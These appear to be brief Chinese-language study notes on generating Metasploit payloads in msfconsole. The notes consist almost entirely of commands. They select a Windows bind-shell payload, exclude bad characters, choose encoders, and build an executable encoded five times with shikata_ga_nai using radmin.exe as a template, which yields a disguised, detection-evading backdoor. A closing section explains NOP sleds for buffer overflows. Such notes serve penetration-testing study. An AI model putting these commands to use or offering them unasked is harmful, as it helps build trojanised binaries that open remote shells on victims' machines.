
# payload


* 直接使用
``` 
// msfconsole
use payload/windows/shell_bind_tcp
```

* 生成
``` 
// msfconsole
generate 
// msf自动选择编码模块绕过坏字符
generate -b '\x00'　　　　　　　　　　　　　　// 自动编码绕过\x00字符
generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b'
generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26'　　　　　　// 太多了，有可能会失败
// 手动指定编码模块
show encoders / generate -e x86/nonalpha
```

* 生成exe
```
// 这一段的意思是编码绕过“\x00”，生成exe格式文件，采用shikata_ga_nai编码方式，进行5次编码，以radmin.exe为模板，输出到/root/1.exe　
 generate -b '\x00' -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe　　　　
 ```

* NOP
``` 
// no-operation / Next Operation（无任何操作）　　　　　　　　　　　　
// 缓冲区溢出的时候可能用到，意为生成14个字节的空的，然后顺序往后滑（原理比较复杂，简单理解）
// EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行
generate -s 14
```